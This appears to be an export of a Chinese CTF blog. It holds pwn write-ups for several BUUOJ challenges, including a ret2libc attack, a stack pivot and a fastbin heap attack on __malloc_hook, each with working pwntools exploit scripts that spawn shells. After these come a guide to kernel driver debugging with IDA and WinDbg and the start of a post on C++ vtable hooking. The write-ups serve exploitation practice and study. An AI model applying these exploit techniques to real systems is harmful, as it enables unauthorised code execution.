class="number">0</span>, buf, <span class="number">0x20</span>u);</span><br><span class="line">  buf[v5 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v1 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(buf, s, v1) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Correct\n&quot;</span>, <span class="number">8u</span>);</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> __int8)buf[<span class="number">7</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">ssize_t</span> __cdecl <span class="title function_">vuln</span><span class="params">(<span class="type">char</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">231</span>]; <span class="comment">// [esp+11h] [ebp-E7h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">0x7F</span> )</span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0xC8</span>u);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, buf, a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>只有当第一次输入与生成的随机数相同时才有机会进入漏洞函数 但是既然是用<code>strncmp</code>进行比较 那么可以让比较的字节数为0来绕过这层检测并保证进入漏洞函数时获得最大的溢出量:</p>
<p><code>payload1 = b&#39;\x00\x00\x00\x00\x00\x00\x00\xff&#39;</code></p>
<p>然后构造泄露libc基址的ROP 这里的思路是利用在<code>handler()</code>中使用了<code>puts</code>这一点来泄露libc 得到libc基址后再回到漏洞函数进行最后一次输入来调用<code>system(&#39;/bin/sh&#39;)</code> 需要注意的是程序是32位的 参数存放在栈中:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_ret = p32(<span class="number">0x8048889</span>)</span><br><span class="line">vuln_func = p32(<span class="number">0x80487D0</span>)</span><br><span class="line"></span><br><span class="line">padding = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0xE7</span> + <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x4</span></span><br><span class="line">payload2 = padding + p32(puts_plt) + vuln_func + p32(puts_got) + p32(<span class="number">0xff</span>)</span><br></pre></td></tr></table></figure>

<p>最后一次发送数据的时候因为硬要用LibcSearcher来猜libc版本卡了一会 实际上题目给了libc版本后可以直接用IDA在其中找到puts函数的相对偏移以计算libc 获得<code>system</code>和<code>b&#39;//bin//sh&#39;</code>的地址也是同理直接在libc里面找 据此构造第三个payload:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sh.recvuntil(<span class="string">&#x27;Correct\n&#x27;</span>)</span><br><span class="line">puts_addr = u32(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">base = puts_addr - <span class="number">0x5F140</span></span><br><span class="line">system = base + <span class="number">0x3A940</span></span><br><span class="line">binsh = base + <span class="number">0x15902B</span></span><br><span class="line"></span><br><span class="line">payload3 = padding + p32(system) + main_ret + p32(binsh)</span><br><span class="line">sh.sendline(payload3)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="BUUOJ-ciscn-2019-ne-5-简单canary"><a href="#BUUOJ-ciscn-2019-ne-5-简单canary" class="headerlink" title="BUUOJ-ciscn_2019_ne_5 | 简单canary"></a>BUUOJ-ciscn_2019_ne_5 | 简单canary</h2><p>只开了NX防护 基本不用考虑ret2shellcode了 主函数没有找到可以操作的部分 直接看漏洞函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">AddLog</span><span class="params">(<span class="type">char</span> *src)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input new log info:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __isoc99_scanf(<span class="string">&quot;%128s&quot;</span>, src);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">GetFlag</span><span class="params">(<span class="type">char</span> *src)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> dest[<span class="number">4</span>]; <span class="comment">// [esp+0h] [ebp-48h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">60</span>]; <span class="comment">// [esp+4h] [ebp-44h] BYREF</span></span><br><span class="line"></span><br><span class="line">  *dest = <span class="number">48</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v3, <span class="number">0</span>, <span class="keyword">sizeof</span>(v3));</span><br><span class="line">  <span class="built_in">strcpy</span>(dest, src);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;The flag is your log:%s\n&quot;</span>, dest);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>dest</code>字符串在栈上 所以<code>src</code>超过<code>dest</code>长度的部分会被复制在栈上导致栈溢出 这里构造ROP的思路是直接利用程序中用到的<code>system()</code>配合字符串<code>fflush</code>后两个字符<code>sh</code>来get shell 但是实操的时候发现如果要利用栈溢出漏洞的话会覆盖一个只在主函数开头初始化的表头指针(ebx)</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/07/08/20240708-103602.png" alt="image-20240708103555476"></p>
<p>如果被无法解引用的4bytes数据覆盖的话程序会直接在<code>puts()</code>就报错然后停止 而表头的地址是<code>0x804A000</code> 用来构造payload的<code>scanf</code>函数会在空格(\x20), 换行(\x0A), 字符串结束符(\x00)处停止输入 无法做到不更改保存ebx栈空间的栈溢出 所以这里返回地址不能选为调用<code>getflag()</code>的下一行的地址 而是<code>exit()</code></p>
<p>构造如下payload:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_got = p32(elf.got[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">system_plt = p32(elf.plt[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">exit_plt = p32(elf.plt[<span class="string">&#x27;exit&#x27;</span>])</span><br><span class="line">padding = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x4C</span></span><br><span class="line">binsh = p32(<span class="number">0x80482EA</span>)</span><br><span class="line"></span><br><span class="line">payload = padding + system_plt+ exit_plt + binsh + p32(<span class="number">0</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;administrator\x00&#x27;</span>)</span><br><span class="line">recvpromt(sh)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;info:&#x27;</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">recvpromt(sh)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">sh.recvline()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="一些迷思"><a href="#一些迷思" class="headerlink" title="一些迷思"></a>一些迷思</h3><p>一开始尝试过使用ret2libc的方法在libc中寻找<code>/bin/sh</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sh.sendline(<span class="string">b&#x27;administrator\x00&#x27;</span>)</span><br><span class="line">recvpromt(sh)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">padding = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x4C</span></span><br><span class="line">payload1 = padding + puts_plt + ret_main + system_got + exit_plt + main_arg + p32(<span class="number">0</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;info:&#x27;</span>)</span><br><span class="line">sh.sendline(payload1)</span><br><span class="line"></span><br><span class="line">recvpromt(sh)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(sh.recvline())</span><br><span class="line">line = sh.recvline()</span><br><span class="line"><span class="built_in">print</span>(line)</span><br><span class="line">system_addr = u32(line[-<span class="number">5</span>:-<span class="number">1</span>])</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;system&#x27;</span>, system_addr)</span><br><span class="line">libc_base = system_addr - libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binsh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>结果puts输出的内容是<img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/07/08/20240708-113408.png" alt="image-20240708113408269"></p>
<img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/07/08/20240708-113611.png" style="zoom:50%;" />

<p>显然不止输出了system的地址 目前还没搞懂为什么 希望以后能搞明白</p>
<h4 id="23-7-16"><a href="#23-7-16" class="headerlink" title="23&#x2F;7&#x2F;16"></a>23&#x2F;7&#x2F;16</h4><p>貌似是因为got表不一定直接跳转到内存中的库函数 前面还有一些指令</p>
<h2 id="BUUOJ-ciscn-2019-es-2-栈迁移"><a href="#BUUOJ-ciscn-2019-es-2-栈迁移" class="headerlink" title="BUUOJ-ciscn_2019_es_2 | 栈迁移"></a>BUUOJ-ciscn_2019_es_2 | 栈迁移</h2><p>只开了NX 基本上不用考虑执行shellcode了 直接看漏洞函数:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vul</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">40</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>溢出的部分最多只到Caller’s EBP和Retaddr 就算原程序加载了<code>system()</code>也不够传入参数 为了扩展可用的栈空间就要用到<strong>栈迁移</strong>技术 </p>
<h3 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h3><p>函数返回时执行的leave和ret指令实际上是几个指令的集合</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">leave _ mov esp,ebp</span><br><span class="line">     |_ pop ebp</span><br><span class="line">ret   _ pop eip</span><br></pre></td></tr></table></figure>

<p>ebp是用于存放调用者ebp的地址的锚点 而从leave指令实际的两条指令可以看出 ebp和esp是完全可以互相影响的 从而eip也能被ebp控制以达到掌握控制流的目的:<code>EBP &lt;--&gt; ESP --&gt; EIP</code></p>
<p>以这一题为例子 用缓冲区首地址<code>buf_addr - 4</code>覆盖Caller’s EBP 再用leave指令的地址覆盖返回地址 这样再次执行leave时esp就会被新锚点骗到缓冲区上 再执行ret时就会将缓冲区上的目标地址送入eip 相当于平时的栈溢出的部分扩展到缓冲区的部分 实现栈迁移</p>
<p>而要实现栈迁移到新的栈地址上最少需要一次泄露栈地址 这题刚好提供了<code>printf()</code>和两次输入</p>
<p>计算出Caller’s ebp的地址距离<code>buf_addr - 4</code>的字节数后就能构造如下的payload:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_2019_es_2&#x27;</span>)</span><br><span class="line">system = p32(elf.plt[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">bin_sh = <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">leav_ret = p32(<span class="number">0x80485FC</span>)</span><br><span class="line"></span><br><span class="line">sh.send(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x28</span>)</span><br><span class="line">msg = sh.recvuntil(<span class="string">b&#x27;\xff&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(msg)</span><br><span class="line">ebp = u32(msg[-<span class="number">4</span>:]) - <span class="number">0x3C</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(ebp))</span><br><span class="line">binsh_addr = ebp + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">payload = system + <span class="string">b&#x27;AAAA&#x27;</span> + p32(binsh_addr) + bin_sh</span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x28</span> - <span class="built_in">len</span>(payload)) + p32(ebp) + leav_ret</span><br><span class="line"></span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="BUUOJ-babyheap-0ctf-2017-堆溢出-Use-after-free"><a href="#BUUOJ-babyheap-0ctf-2017-堆溢出-Use-after-free" class="headerlink" title="BUUOJ-babyheap_0ctf_2017 | 堆溢出 | Use after free"></a>BUUOJ-babyheap_0ctf_2017 | 堆溢出 | Use after free</h2><p>前置知识 : <a href="https://wiki.wgpsec.org/knowledge/ctf/basicheap.html">https://wiki.wgpsec.org/knowledge/ctf/basicheap.html</a></p>
<p>直接看主函数:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 *chunks; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  chunks = (__int64 *)sub_56219BC00B70();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    <span class="keyword">switch</span> ( get_num() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1LL</span>:</span><br><span class="line">        alloc(chunks);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2LL</span>:</span><br><span class="line">        fill(chunks);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3LL</span>:</span><br><span class="line">        free_0(chunks);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4LL</span>:</span><br><span class="line">        dump(chunks);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5LL</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据输入进行操作</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> - 申请一个堆 记录在程序自己的结构体chunks中 chunks中记录chunks是否在使用, Size, Chunk</span><br><span class="line"><span class="number">2</span> - 选择一个chunk编辑其data区域</span><br><span class="line">    此处存在堆溢出 编辑一个chunk的数据时没有检测大小 可以修改下一个chunk的数据</span><br><span class="line"><span class="number">3</span> - 释放一个chunk</span><br><span class="line"><span class="number">3</span> - 根据chunks中的Size显示一个chunk的数据</span><br></pre></td></tr></table></figure>

<p>这里可以使用第n个chunk编辑第n+1个chunk的header来让其size足够覆盖第n+2个chunk 当第n+2个chunk被释放进<code>unsorted bin</code>时通过n+1来显示n+2中储存的<code>fd</code>和<code>bk</code>的值 因为<code>unsorted bin</code>中只有它一个chunk, <code>fd</code>和<code>bk</code>都指向<code>main_arena + offset</code> 据此可以泄露libc的基址 然后再通过构造fake chunk来进行任意地址写 覆盖<code>__malloc_hook</code>指针 使其变为我们找到的one gadget 此时再申请堆时就会触发原本应该触发<code>__malloc_hook</code>的one gadget</p>
<h3 id="具体思路"><a href="#具体思路" class="headerlink" title="具体思路"></a>具体思路</h3><p>先使用<a href="https://github.com/bash-c/main_arena_offset/blob/master/main_arena">工具</a>找到后面要用的main_arena在libc中的地址:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F10%2F15%2F20241015-202523.png" alt="image-20241015202428887"></p>
<p>再用<a href="https://github.com/david942j/one_gadget">另一个工具</a>找到libc中存在的one gadget:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F10%2F15%2F20241015-203101.png" alt="image-20241015203101596"></p>
<h4 id="覆盖chunk1的header"><a href="#覆盖chunk1的header" class="headerlink" title="覆盖chunk1的header"></a>覆盖chunk1的header</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">alloc(<span class="number">0x10</span>) <span class="comment"># 0</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment"># 1</span></span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment"># 2</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment"># 3</span></span><br><span class="line">fill(<span class="number">0</span>, p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0xB1</span>))</span><br></pre></td></tr></table></figure>

<p>修改掉chunk1的header中的<code>size</code>字段并释放chunk1后 下次再分配0xA0(+ 0x10(header长度) | 1(<code>P</code>标志位) &#x3D;&#x3D; 0xB1)大小的chunk时会因为检测到<code>fast bin</code>中有对应大小的chunk而直接分配到原来chunk1的位置</p>
<p>这里创建chunk3的目的是防止chunk2在后续释放时直接被划入<code>top chunk</code></p>
<h4 id="使用覆盖chunk2的chunk1泄露libc-base"><a href="#使用覆盖chunk2的chunk1泄露libc-base" class="headerlink" title="使用覆盖chunk2的chunk1泄露libc base"></a>使用覆盖chunk2的chunk1泄露libc base</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">alloc(<span class="number">0xA0</span>) <span class="comment"># 1</span></span><br><span class="line">fill(<span class="number">1</span>, <span class="string">b&#x27;A&#x27;</span> * <span class="number">3</span> * <span class="number">8</span> + p64(<span class="number">0x91</span>))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">data = dump(<span class="number">1</span>)</span><br><span class="line">base = <span class="built_in">int</span>.from_bytes(data[:data.index(<span class="string">b&#x27;\x7f&#x27;</span>) + <span class="number">1</span>][-<span class="number">6</span>:], <span class="string">&#x27;little&#x27;</span>) - (main_arena + <span class="number">0x58</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;libc_base = <span class="subst">&#123;<span class="built_in">hex</span>(base)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>这里对chunk1进行编辑并且覆盖chunk2的原因是程序<code>calloc()</code>分配chunk会初始化data为{0}需要修复chunk2的chunk header</p>
<h4 id="覆盖chunk2的fd字段伪造fake-chunk"><a href="#覆盖chunk2的fd字段伪造fake-chunk" class="headerlink" title="覆盖chunk2的fd字段伪造fake chunk"></a>覆盖chunk2的fd字段伪造fake chunk</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">one_gadget = base + one[<span class="number">1</span>]</span><br><span class="line">malloc_hook = base + so.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">fkfd = malloc_hook - <span class="number">0x23</span></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment"># 2</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">fill(<span class="number">1</span>, <span class="string">b&#x27;B&#x27;</span> * <span class="number">3</span> * <span class="number">8</span> + p64(<span class="number">0x71</span>) + p64(fkfd))</span><br></pre></td></tr></table></figure>

<p>覆盖前:</p>
<p><code>(0x60 bytes)Fast bin -&gt; chunk2</code></p>
<p>覆盖后:</p>
<p><code>(0x60 bytes)Fast bin -&gt; chunk2 -&gt; fake chunk</code></p>
<p>再申请两个size均为0x60的chunk就能获取到对fake chunk 也就是<code>__malloc_hook</code>所在内存区域进行写的能力了</p>
<p>这里fake fd选择在 - 0x23偏移的原因是fastbin在分配chunk的时候会检测chunk的<code>P</code>标志位 而 - 0x23位置对应的chunk <code>P</code>标志位所在字节是b’\x7f’ 最低位是1 符合了fastbin分配chunk的条件</p>
<h4 id="覆盖-malloc-hook"><a href="#覆盖-malloc-hook" class="headerlink" title="覆盖__malloc_hook"></a>覆盖__malloc_hook</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">alloc(<span class="number">0x60</span>) <span class="comment"># 2</span></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment"># 4</span></span><br><span class="line">fill(<span class="number">4</span>, <span class="string">b&#x27;C&#x27;</span> * <span class="number">0x13</span> + p64(one_gadget))</span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment"># 5</span></span><br></pre></td></tr></table></figure>

<p>申请chunk5时程序就会调用原本应该是<code>__malloc_hook</code>的one gadget达成get shell</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>PWN</category>
      </categories>
      <tags>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>IDA配合VMware进行内核(驱动)调试</title>
    <url>/2024/09/28/IDA%E9%85%8D%E5%90%88VMware%E8%BF%9B%E8%A1%8C%E5%86%85%E6%A0%B8-%E9%A9%B1%E5%8A%A8-%E8%B0%83%E8%AF%95/</url>
    <content><![CDATA[<p>介绍一下如何用IDA配合Windbg和Vmware调试内核</p>
<span id="more"></span>

<h2 id="虚拟机准备"><a href="#虚拟机准备" class="headerlink" title="虚拟机准备"></a>虚拟机准备</h2><p>新增一个串行端口:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F28%2F20240928-134238.png" alt="image-20240928134238807"></p>
<p>如果设备里有打印机要把打印机移除 否则包括以下步骤使用的管道要改成com2</p>
<p>命令行打开msconfig 然后配置默认启动调试机:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F28%2F20240928-135341.png"></p>
<h2 id="物理机准备"><a href="#物理机准备" class="headerlink" title="物理机准备"></a>物理机准备</h2><p>虚拟机上配置好后先打开Windbg检查是否能进行内核调试:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F28%2F20240928-135805.png" alt="image-20240928135805578"></p>
<p>如果成功的话应该会显示内核断在一个硬件断点上:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F28%2F20240928-135901.png" alt="image-20240928135901744"></p>
<p>这时候用IDA打开要调试的驱动文件(.sys) 选择Windbg调试器:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F28%2F20240928-140006.png" alt="image-20240928140006899"></p>
<p>配置调试器设置如下:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F28%2F20240928-140133.png" alt="image-20240928140133914"></p>
<p>Connection string填<code>com:port=//./pipe/com1,baud=115200,pipe</code> (如果之前用的是com1)</p>
<p>这时候选择Attach to process 如果成功的话会显示虚拟机内核:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F28%2F20240928-140335.png" alt="image-20240928140335125"></p>
<p>下好断点后运行附加到内核上进行调试 一开始会断在硬件断点上 直接放行 运行会调用目标驱动的程序后内核会断在之前下好的断点上</p>
]]></content>
      <categories>
        <category>Windows内核</category>
      </categories>
      <tags>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>C/C++反逆向技巧鉴赏</title>
    <url>/2024/09/15/C-%E5%8F%8D%E9%80%86%E5%90%91%E6%8A%80%E5%B7%A7%E9%89%B4%E8%B5%8F/</url>
    <content><![CDATA[<p>记录一下比赛中遇到的各种C++的反逆向技巧(主要是Windows API)</p>
<span id="more"></span>

<h1 id="虚表-hook"><a href="#虚表-hook" class="headerlink" title="虚表 hook"></a>虚表 hook</h1><h2 id="C-类中各种成员在内存中的分布"><a href="#C-类中各种成员在内存中的分布" class="headerlink" title="C++类中各种成员在内存中的分布"></a>C++类中各种成员在内存中的分布</h2><p>以以下代码编译出的二进制文件为例:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">vmt_test</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> var;</span><br><span class="line">    <span class="built_in">vmt_test</span>()&#123;</span><br><span class="line">        var = <span class="number">10</span>;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Test constructor&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">function1_To_hook</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Function1 in VMT, Havnt been hooked&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">function2</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Function2 in VMT&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">function3</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Function3 not in VMT&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">vmt_drivation</span> : <span class="keyword">public</span> vmt_test&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">function1_To_hook</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Function1 in Drivation, Havnt been hooked&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">hook</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Hooked&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    vmt_test* test = <span class="keyword">new</span> <span class="built_in">vmt_test</span>();</span><br><span class="line">    test-&gt;<span class="built_in">function1_To_hook</span>();</span><br><span class="line">    test-&gt;<span class="built_in">function2</span>();</span><br><span class="line">    vmt_test* test2 = <span class="keyword">new</span> <span class="built_in">vmt_test</span>();</span><br><span class="line">    test2-&gt;<span class="built_in">function3</span>();</span><br><span class="line">    vmt_drivation* drv = <span class="keyword">new</span> <span class="built_in">vmt_drivation</span>();</span><br><span class="line">    drv-&gt;<span class="built_in">function1_To_hook</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="非虚成员函数"><a href="#非虚成员函数" class="headerlink" title="非虚成员函数"></a>非虚成员函数</h3><p>和普通函数一样没有区别 在<code>.text</code>段实现 不被除了调用处以外的地方引用:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F15%2F20240915-093329.png" alt="image-20240915093322380"></p>
<h3 id="虚成员函数"><a href="#虚成员函数" class="headerlink" title="虚成员函数"></a>虚成员函数</h3><p>在<code>.text</code>段实现 不会被调用处引用外且排列在<code>VMT</code> 即虚函数表中 在调用该函数时通过查表调用:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F15%2F20240915-094620.png" alt="image-20240915094620479"></p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F15%2F20240915-094223.png" alt="image-20240915094223312"></p>
<p>虚函数表相当于一个特殊的类成员变量 初始化时被赋值给实例的类对象偏移为0的位置:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F15%2F20240915-094410.png" alt="image-20240915094410949"></p>
<h3 id="继承类的虚函数"><a href="#继承类的虚函数" class="headerlink" title="继承类的虚函数"></a>继承类的虚函数</h3><p>新建一张虚函数表 对已经实现的虚函数进行替换 没有实现的虚函数则引用原虚函数表中的对应函数 如果继承类没有自己的构造函数则调用基类的构造函数中将基类的VMT赋给偏移为0的内存 再在构造函数后用新的VMT覆盖:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F15%2F20240915-095120.png" alt="image-20240915095120334"></p>
